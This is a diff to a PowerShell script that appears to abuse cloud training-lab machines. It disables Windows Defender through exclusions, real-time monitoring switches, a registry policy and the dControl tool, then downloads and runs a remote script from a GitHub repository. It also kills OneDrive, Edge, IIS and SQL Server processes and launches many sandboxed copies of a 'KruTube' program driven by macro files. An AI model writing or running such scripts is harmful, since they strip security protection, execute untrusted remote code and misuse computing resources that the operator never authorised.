@@ -1,4 +1,4 @@
-$fileNumber = Read-Host -Prompt "Enter the number of the file you want to open (1 to 9)"
+$fileNumber = Read-Host -Prompt "Enter the number of the file you want to open (1 to 40)"
 $pagefile = Get-WmiObject Win32_ComputerSystem -EnableAllPrivileges
 $pagefile.AutomaticManagedPagefile = $false
 $pagefile.put() | Out-Null
@@ -7,7 +7,7 @@ $pagefileset.InitialSize = 90024
 $pagefileset.MaximumSize = 90048
 $pagefileset.Put() | Out-Null
 Add-MpPreference -ExclusionPath "C:\Program Files (x86)\DefenderControl\dControl.exe"
-Add-MpPreference -ExclusionPath "C:\Users\MS Learn Labs\Desktop\*"
+Add-MpPreference -ExclusionPath "$env:USERPROFILE\Desktop\*"
 Set-MpPreference -DisableRealtimeMonitoring $true
 Set-MpPreference -DisableBehaviorMonitoring $true
 Set-MpPreference -DisableArchiveScanning $true
@@ -22,38 +22,48 @@ $extractPath = "$env:USERPROFILE\Desktop"
 Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
 Expand-Archive -Path $zipFilePath -DestinationPath $extractPath -Force
 Start-Process -FilePath "$extractPath\dControl.exe"
+Stop-Process -Name msedgedriver -Force
+Stop-Process -Name msedge -Force
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -Force
 Invoke-WebRequest -Uri "https://bits.avcdn.net/productfamily_VPN/insttype_PRO/platform_WIN/installertype_ONLINE/build_RELEASE/cookie_mmm_scl_998_999_000_m:dlid_SLN-TRIAL-ONLINE-PP?alt=en-us" -OutFile "$env:USERPROFILE\Desktop\avast.exe"
 Start-Process -FilePath "$extractPath\avast.exe"
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/najam121/free-check-ms/main/b.ps1' -OutFile 'C:\Users\MS Learn Labs\Desktop\b.ps1'
-Start-Process powershell -ArgumentList '-File "C:\Users\MS Learn Labs\Desktop\b.ps1"'
 
-for ($i = 1; $i -le 9; $i++) {
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/najam121/free-check-ms/refs/heads/main/b.ps1' -OutFile "$env:USERPROFILE\Desktop\b.ps1"
+$scriptPathss = "$env:USERPROFILE\Desktop\b.ps1"
+Start-Process powershell -ArgumentList "-File `"$scriptPathss`""
+
+for ($i = 1; $i -le 40; $i++) {
     $fileUrl = "https://raw.githubusercontent.com/user009dm/new/main/$i.mrf"
     $filePath = "$env:USERPROFILE\Desktop\$i.mrf"
     Invoke-WebRequest -Uri $fileUrl -OutFile $filePath
 }
 
- $chosenFilePath = "C:\Users\MS Learn Labs\Desktop\$fileNumber.mrf"
- $macroRecorderPath = "C:\Users\MS Learn Labs\Desktop\MacroRecorder\MacroRecorder.exe"
-Invoke-WebRequest -Uri "https://www.macrorecorder.com/MacroRecorder_Portable.zip" -OutFile "C:\Users\MS Learn Labs\Desktop\MacroRecorder_Portable.zip"
-Expand-Archive -Path "C:\Users\MS Learn Labs\Desktop\MacroRecorder_Portable.zip" -DestinationPath "C:\Users\MS Learn Labs\Desktop"
+ 
+Invoke-WebRequest -Uri "https://www.macrorecorder.com/MacroRecorder_Portable.zip" -OutFile "$env:USERPROFILE\Desktop\MacroRecorder_Portable.zip"
+Expand-Archive -Path "$env:USERPROFILE\Desktop\MacroRecorder_Portable.zip" -DestinationPath "$env:USERPROFILE\Desktop"
 taskkill /f /im OneDrive.exe
+taskkill /f /im Batch.exe
+taskkill /f /im w3wp.exe
+taskkill /f /im sqlservr.exe
 
-Invoke-WebRequest -Uri "https://letsunlockphone.com/rdpdfsffddf/Sandboxie-new.zip" -OutFile "C:\Users\MS Learn Labs\Desktop\Sandboxie-new.zip"
-Expand-Archive -Path "C:\Users\MS Learn Labs\Desktop\Sandboxie-new.zip" -DestinationPath "C:\Users\MS Learn Labs\Desktop"
-Start-Process -FilePath "C:\Users\MS Learn Labs\Desktop\Sandboxie\SandMan.exe"
+Invoke-WebRequest -Uri "https://github.com/user009dm/new/raw/main/Sandboxie-new.zip" -OutFile "$env:USERPROFILE\Desktop\Sandboxie-new.zip"
+Expand-Archive -Path "$env:USERPROFILE\Desktop\Sandboxie-new.zip" -DestinationPath "$env:USERPROFILE\Desktop"
+Start-Process -FilePath "$env:USERPROFILE\Desktop\Sandboxie\SandMan.exe"
 Start-Service -Name "audiosrv"
 Write-Host "Press any key to continue..."
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
-Set-Location -Path "C:\Users\MS Learn Labs\Desktop\Sandboxie\"
+Set-Location -Path "$env:USERPROFILE\Desktop\Sandboxie\"
 for ($i = 1; $i -le 10; $i++) {
     # Configure Sandboxie box
-    & "C:\Users\MS Learn Labs\Desktop\Sandboxie\sbieini.exe" set $i "Enabled y"
-    & "C:\Users\MS Learn Labs\Desktop\Sandboxie\sbieini.exe" set $i "AutoRecover n"
-    & "C:\Users\MS Learn Labs\Desktop\Sandboxie\sbieini.exe" set $i "BorderColor #00FFFF,ttl,6"
-    & "C:\Users\MS Learn Labs\Desktop\Sandboxie\sbieini.exe" set $i "BoxNameTitle y"
-    Start-Process -FilePath "Start.exe" -ArgumentList "/box:$i `"C:\Users\MS Learn Labs\Desktop\KruTube\KruTube.exe`"" -WindowStyle Maximized
+    & "$env:USERPROFILE\Desktop\Sandboxie\sbieini.exe" set $i "Enabled y"
+    & "$env:USERPROFILE\Desktop\Sandboxie\sbieini.exe" set $i "AutoRecover n"
+    & "$env:USERPROFILE\Desktop\Sandboxie\sbieini.exe" set $i "BorderColor #00FFFF,ttl,6"
+    & "$env:USERPROFILE\Desktop\Sandboxie\sbieini.exe" set $i "BoxNameTitle y"
+    Start-Process -FilePath "Start.exe" -ArgumentList "/box:$i `"$env:USERPROFILE\Desktop\KruTube\KruTube.exe`"" -WindowStyle Maximized
 }
 
+$chosenFilePath = "$env:USERPROFILE\Desktop\$fileNumber.mrf"
+$macroRecorderPath = "$env:USERPROFILE\Desktop\MacroRecorder\MacroRecorder.exe"
 Start-Process -FilePath $macroRecorderPath -ArgumentList "-open=`"$chosenFilePath`""
+
+exit
